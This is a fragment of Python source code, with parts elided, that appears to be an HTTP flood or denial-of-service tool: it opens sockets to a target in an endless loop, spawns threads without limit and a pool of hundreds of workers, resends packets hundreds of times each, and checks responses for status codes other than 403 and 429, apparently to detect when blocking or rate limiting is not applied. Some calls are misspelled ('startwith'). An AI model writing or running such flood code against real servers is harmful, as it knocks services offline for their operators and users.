...
def rapid_sent(s,packet_raw,paths):
    try:
     for _ in range(500):
           s.sendall(pkt(packet_raw))
           options = reply_recheck(s.recv())
           status_page = int(s.recv().split(b'\r\n\r\n')[0].split(b'\r\n')[0].split()[1])
           if status_page not in [403,429] and str(status_page).startwith('2') or str(status_page).startwith('3'):
            for a in paths:
...
def Rapid_sender(target,s,packet_raw,paths):
   while True:
     threading.Thread(target=rapid_sent,args=(s,packet_raw,paths)).start()
     s = sock_build(target)

def fast_thread_pool(target,meth,n_threads,paths):
    with ThreadPoolExecutor(max_workers=n_threads*500) as executor:list(executor.submit(Rapid_sender,target,sock_build(target),[target['uri'],meth],paths) for i in range(n_threads*500))
...
def trace_link(data,links,path,target,protocols,header):
    thread_append = []
    for tag_set in data:
      for tag in tag_set:
        try:
